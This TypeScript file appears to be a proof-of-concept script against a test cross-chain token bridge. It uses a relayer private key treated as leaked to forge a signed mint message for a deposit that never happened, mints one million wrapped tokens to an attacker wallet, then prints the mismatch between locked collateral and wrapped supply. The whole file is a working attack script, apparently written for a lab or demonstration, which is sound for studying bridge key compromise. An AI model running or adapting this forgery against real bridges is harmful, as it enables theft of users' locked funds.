import {
  JsonRpcProvider, Wallet, Contract, getBytes,
  solidityPackedKeccak256, parseUnits, formatUnits,
} from "ethers";
import * as fs from "fs";
import { CHAIN_A_URL, CHAIN_B_URL, ATTACKER_KEY, RELAYER_KEY } from "./config";

function loadAbi(name: string) {
  return JSON.parse(
    fs.readFileSync(`artifacts/contracts/${name}.sol/${name}.json`, "utf8")
  ).abi;
}

async function main() {
  const addrs = JSON.parse(fs.readFileSync("deployments.json", "utf8"));
  const opts = { cacheTimeout: -1 };
  const providerA = new JsonRpcProvider(CHAIN_A_URL, undefined, opts);
  const providerB = new JsonRpcProvider(CHAIN_B_URL, undefined, opts);

  const attacker = new Wallet(ATTACKER_KEY, providerB);
  const stolenRelayerKey = new Wallet(RELAYER_KEY); // pretend this leaked
  const mint = new Contract(addrs.mint, loadAbi("BridgeMint"), attacker);
  const wrapped = new Contract(addrs.wrapped, loadAbi("WrappedToken"), providerB);
  const token = new Contract(addrs.token, loadAbi("TestToken"), providerA);

  const amount = parseUnits("1000000", 18);

  // Forge a message for a deposit that never happened
  const hash = solidityPackedKeccak256(["address", "uint256"], [attacker.address, amount]);
  const signature = await stolenRelayerKey.signMessage(getBytes(hash));
  console.log("Forged a signature for 1,000,000 wTOK using the stolen relayer key");

  await (await mint.mintWithSignature(attacker.address, amount, signature)).wait();
  console.log("Mint contract accepted the forged message");

  const locked = await token.balanceOf(addrs.lock);
  const supply = await wrapped.totalSupply();
  const stolen = await wrapped.balanceOf(attacker.address);
  console.log(`Locked on Chain A:        ${formatUnits(locked, 18)} TOK`);
  console.log(`wTOK supply on Chain B:   ${formatUnits(supply, 18)} wTOK`);
  console.log(`Attacker holds:           ${formatUnits(stolen, 18)} wTOK`);
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
